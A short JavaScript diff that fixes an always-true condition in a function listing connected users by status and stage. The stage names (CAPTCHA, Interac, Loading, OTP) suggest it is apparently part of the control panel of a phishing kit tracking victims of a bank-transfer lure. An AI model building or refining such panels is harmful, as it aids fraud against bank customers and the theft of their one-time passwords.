@@ -53,7 +53,7 @@ function updateConnectionsTable(users){
             color = details.status === 'actif' ? 'success' : 'danger'; // Use success for actif, danger otherwise
         }
 
-        if(details.stage != 'CAPTCHA' || details.stage != 'Interac'){
+        if(details.stage != 'CAPTCHA' && details.stage != 'Interac' && details.stage != 'Loading' && details.stage != 'OTP'){
           userDiv.innerHTML = `
         
           <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
